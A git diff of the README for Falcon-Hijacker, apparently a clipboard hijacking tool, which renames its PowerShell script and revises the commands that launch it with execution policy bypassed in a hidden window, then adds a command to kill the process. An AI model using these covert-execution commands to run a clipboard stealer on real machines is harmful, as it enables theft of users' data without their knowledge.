@@ -2,8 +2,8 @@
 
 <p align="center">
     <img src="https://raw.githubusercontent.com/rgsecteam/rgsectm/refs/heads/main/image/thumbinels/falcon.png">
+    
 </p>
-
 <img src="https://img.shields.io/badge/License-MIT-blue.svg">
 
 # What is Falcon-Hijacker?
@@ -45,12 +45,19 @@ bash falcon.sh
 <p>Run the following command on windows matchin. </p>
 
 ```
-powershell -NoP -NonI -W h -Exec Bypass .\clipboardhijacker.ps1
+powershell -NoP -NonI -W h -Exec Bypass .\clipboard_logger.ps1
 ```
 <p>For Hidden Execution</p>
 
 ```
-Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File .\clipboardhijacker.ps1"
+Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File .\clipboard_logger.ps1" -WindowStyle Hidden
+```
+
+## Stop Hidden Execution
+<p style="color:red">For Stop Powershell Background Process.</p>
+
+```
+Stop-Process -Name powershell -Force
 ```
 
 ## Legal & Ethical Notice
@@ -62,4 +69,4 @@ By using the materials in this repository you agree to:
 
 #### For More Video subcribe <a href="http://youtube.com/@RGSecurityTeam">RGSecurityTeam YouTube Channel</a>
 
-<p>Falcon-hijacker is inspired by https://github.com/techchipnet/ Big thanks to @techchipnet</p>
+<p>Falcon-hijacker is inspired by https://github.com/techchipnet/ <br> Big thanks to <a href="https://github.com/techchipnet">@techchipnet</a></p>
